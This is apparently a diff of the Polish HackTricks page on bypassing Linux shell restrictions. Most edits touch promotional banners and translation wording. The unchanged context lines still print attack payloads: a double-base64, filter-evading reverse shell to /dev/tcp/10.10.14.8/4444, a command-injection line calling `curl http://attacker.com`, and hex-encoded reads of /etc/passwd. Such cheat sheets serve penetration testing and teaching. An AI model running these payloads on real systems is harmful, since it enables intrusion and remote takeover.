@@ -1,23 +1,24 @@
 # Ominięcie Ograniczeń Linuxa
 
+{% hint style="success" %}
+Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Szkolenie AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Szkolenie GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Zacznij od zera i opanuj hakowanie AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wesprzyj HackTricks</summary>
 
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) do łatwego tworzenia i **automatyzacji workflowów** zasilanych przez najbardziej zaawansowane narzędzia społecznościowe na świecie.\
 Zdobądź Dostęp Dziś:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
@@ -30,7 +31,7 @@ Zdobądź Dostęp Dziś:
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Krótka powłoka odwrotnego połączenia
+### Krótka powłoka odwrotna
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -144,7 +145,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Ominięcie blokady IP
+### Ominięcie adresów IP
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -158,13 +159,13 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### Ekstrakcja danych DNS
+### Eksfiltracja danych DNS
 
 Możesz użyć **burpcollab** lub [**pingb**](http://pingb.in) na przykład.
 
 ### Wbudowane funkcje
 
-W przypadku gdy nie możesz wykonać zewnętrznych funkcji i masz dostęp jedynie do **ograniczonego zestawu wbudowanych funkcji do uzyskania RCE**, istnieją przydatne sztuczki pozwalające to zrobić. Zazwyczaj **nie będziesz w stanie użyć wszystkich** wbudowanych funkcji, dlatego powinieneś **znać wszystkie dostępne opcje**, aby spróbować ominąć więzienie. Pomysł pochodzi od [**devploit**](https://twitter.com/devploit).\
+W przypadku gdy nie możesz wykonać zewnętrznych funkcji i masz dostęp jedynie do **ograniczonego zestawu wbudowanych funkcji do uzyskania RCE**, istnieją przydatne sztuczki pozwalające to zrobić. Zazwyczaj **nie będziesz w stanie użyć wszystkich** **wbudowanych funkcji**, dlatego powinieneś **znać wszystkie dostępne opcje**, aby spróbować ominąć więzienie. Pomysł pochodzi od [**devploit**](https://twitter.com/devploit).\
 Po pierwsze sprawdź wszystkie [**wbudowane funkcje powłoki**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Następnie masz kilka **rekomendacji**:
 ```bash
 # Get list of builtins
@@ -228,8 +229,6 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
-
-### Bashfuscator
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -281,7 +280,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### RCE z 4 znakami
+### Uruchamianie kodu zdalnego z wykorzystaniem 4 znaków
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -318,7 +317,7 @@ ln /f*
 ```
 ## Bypass ochrony tylko do odczytu/Noexec/Distroless
 
-Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec** lub nawet w kontenerze distroless, istnieją nadal sposoby na **wykonywanie dowolnych binarnych plików, nawet powłoki!:**
+Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec** lub nawet w kontenerze distroless, istnieją nadal sposoby na **wykonanie dowolnych binarnych plików, nawet powłoki!:**
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
@@ -330,7 +329,7 @@ Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
 {% endcontent-ref %}
 
-## Odwołania i Więcej
+## Odnośniki i Więcej
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 * [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
@@ -340,21 +339,22 @@ Jeśli znajdujesz się w systemie plików z **ochroną tylko do odczytu i noexec
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Użyj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności na świecie.\
+Użyj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społeczności.\
 Otrzymaj Dostęp Dziś:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
+{% hint style="success" %}
+Naucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Naucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Zacznij od zera i zostań ekspertem AWS hackingu dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Wesprzyj HackTricks</summary>
 
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
 
 </details>
+{% endhint %}
